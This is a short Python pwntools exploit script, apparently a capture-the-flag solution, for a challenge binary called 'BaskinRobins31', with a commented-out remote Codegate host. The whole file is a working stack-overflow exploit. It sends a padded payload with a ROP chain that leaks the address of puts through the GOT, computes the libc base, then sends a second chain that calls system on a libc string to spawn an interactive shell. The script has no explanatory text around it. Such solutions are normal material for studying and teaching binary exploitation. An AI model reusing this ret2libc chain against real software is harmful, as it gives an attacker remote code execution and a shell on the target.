from pwn import *
context.log_level='debug'
libc=ELF('../libc-2.23.so')
p=process('./BaskinRobins31')
#p=remote('ch41l3ng3s.codegate.kr',3131)
#gdb.attach(p,'b *0x4008f4')

pop_rdi_ret=0x400bc3
got_puts=0x602020
plt_puts=0x4006c0
entry=0x400780

p.recvuntil('(1-3)\n')
payload='a'*0xb0+'deadbeef'+p64(0x400bc3)
payload+=p64(0x602020)+p64(0x4006c0)+p64(0x400780)
p.sendline(payload)
p.recvuntil(':( \n')
libc_base=u64(p.recv(6).ljust(8,'\x00'))-libc.symbols['puts']
print '[*]'+hex(libc_base)

p.recvuntil('(1-3)\n')
payload='a'*0xb0+'deadbeef'+p64(0x40087a)
payload+=p64(libc_base+0x18CD57)+p64(0)*2+p64(libc_base+libc.symbols['system'])

p.sendline(payload)

#p.sendline('a'*0xb0+p64(0x7ffe46a82200))
p.interactive()
